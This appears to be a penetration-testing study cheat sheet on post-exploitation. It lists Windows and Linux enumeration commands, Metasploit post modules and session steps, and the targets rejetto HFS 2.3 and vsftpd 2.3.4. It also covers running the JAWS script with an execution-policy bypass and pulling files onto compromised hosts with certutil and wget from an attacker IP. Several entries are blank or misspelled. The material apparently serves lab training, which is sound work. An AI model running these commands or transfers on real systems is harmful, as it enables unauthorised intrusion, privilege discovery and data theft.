# Post-Exploitation
## Windows Local Enumeration

### Enumerating System information
What are we looking for:
        1. Hostname = `hostname`, `systeminfo`
        2. OS name = `systeminfo`
        3. OS Build & Service Pack(Windows 7 SP1 7600) = `systeminfo`
        4. OS Architecture(x64/x86) = `systeminfo`
        5. Installed updates/Hotfixes = `wmic qfe get Caption,Description,HotFixID,InstalledOn`, `systeminfo`
HttpFileServer 2.3 = rejetto, searchsploit rejetto
After gaining a reverse shell: `getuid`

### Enumerating Users & Groups
What are we looking for:
1. Current user & priveleges = `getuid`, `getprivs`,`whoami`
2. Additional user information = `whoami /priv`, `net user user_to_look_into`
3. other users on the system = `query user`, `net users`
4. Groups = `net localgroup`
5. Members of the built-in administrator group = `net localgroup administrators`
   
msfconsole module for logged on and previously logged on users:
1. background previous session(CTRL+z): `search logged_on`
2. `use 0` (`post/windows/gather/enum_logged_on_users`)
3.  `set SESSION ID`
4.  `run`
    
### Enumerate Network Information
What are we looking for:
1. Current IP address & network adapter = `ipconfig`, `ipconfig /all`
2. Internal networks = `arp -a`, `ipconfig /all`
3. TCP/UDP services running and their respective ports = `netstat -ano`
4. Other hosts on the network = ``
5. Routing Table = ``
6. Windows Firewall state = `netsh advfirewall firewall`,`netsh advfirewall firewall show allprofiles` `netsh firewall show state`

### Enumerating Processes & Services
What are we lookin for:
1. Running processes & services = `ps`, `tasklist /SVC`
2. Services = `net start`, 
3. Identify Process = `pgrep process`, migrate to:`migrate process`
4. Scheduled tasks = `wmic service list brief`

 ### Automating Windows Local Enumeration
 JAWS: https://github.com/411Hall/JAWS
 1. Save Raw file on vm and copy content: `CTRL + SHIFt + ALT` to open clipboard, and paste into empty file, store it on Desktop --> filename: jaws-enum.ps1
 1. msfconsole Session: `sessions 1`(choose session)
 2. On victim machine go to temp: `cd C:\\`, if not exist `mkdir Temp` and cd in to it.
 3. Upload file: `upload /root/Desktop/jaws-enum.ps1`
 4. Open shell session & running file: `shell` -> `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
 5. Terminate channel and download to attacker pc: Terminate:`CTRL+c`, `download JAWS-Enum.txt`

## Linux Local Enumeration 
### Enumerating System information
*Target port and exploit: ftp port 21 , vsftpd 2.3.4*
*spawn terminal`/bin/bash -i`*
Upgrade to meterpreter session: background session `CTRL+z`, `sessions -u 1`, 
What are we looking for:
1. Hostname =  `hostname`
2. OS = `sysinfo`
3. Distribution & distribution release version = `cat /etc/*release`
4. Kernel version & architecture = `uname -a`, kernel :`uname r`
5. CPU information = `lscpu`
6. Disk information & mounted drives = `df -h`
7.  Installed  Packages & updates/Hotfixes = `dpkg -l`


### Enumerating Users & Groups
What are we looking for:
1. Current user & priveleges = `getuid`, `whoami`
2. Additional user information = ``
3. other users on the system = `cat /etc/passwd`
4. last logged in: `lastlog`
5. Groups = `groups`
6. Members of the built-in administrator group = ``

### Enumerate Network Information
1. Current IP address & network adapter = meterpreter:`ifconfig`, /bin/bash -i:
2. Internal networks = ``
3. TCP/UDP services running and their respective ports = meterpreter:`netstat`, /bin/bash -i:
4. Other hosts on the network =  /bin/bash -i: `ip a s`
5. route = meterpreter:`route`, /bin/bash -i:

### Enumerating Processes & Services & CRON jobs
What are we lookin for:
1. Running processes ID's & services = `ps`, `top`
2. cron jobs(scheduled tasks) = `crontab -l`, `ls -al /etc/cron*`

### Autamating Linux enumeration
1. in msfconsole `search enum_configs`
2. msfconsole: `search enum_network`
3. msfconsole: `search enum_system`


## File Transfer
1. Setting up Python server
   1. python2: `python -m SimpleHTTPServer 80`
   2. python3: `python3 -m http.server 80`
2. Transferring files to Windows targets
   1. exploiting rejetto
   2. set up netcat: `nc -nvlp 1234`
   3. net tab, where netcat.exe(nc.exe) is: `cd /usr/share/windows-binaries` -> `python3 -m http.server 80`
   4. lunch exploit
   5. On targtet system: `cd C:\\` -> go to temp or create folder `mkdir Temp` -> `cd Temp`
   6. Transfer file: `certutil -urlcache -f http://10.10.x.x/file_you_want_to_transfer.exe name_your_file.exe` . !!IMPORTANT!! be in the directory where the file yoou want to transfer is located
3. Transferring files to Linux targets
   1. Target system, go to /tmp
   2. set up python server(see windows)
   3. Download file: `wget http://10.10.x.x/file_you_want_to_transfer.php`

## Upgrading non-interactive shells
- `/bin/bash -i`
- Display list of shells: `cat /etc/shells`
- Check if python is installed: `python --version`
      1. Python2(python3 ?): `python -c 'import pty; pty.spawn("/bin/bash")'`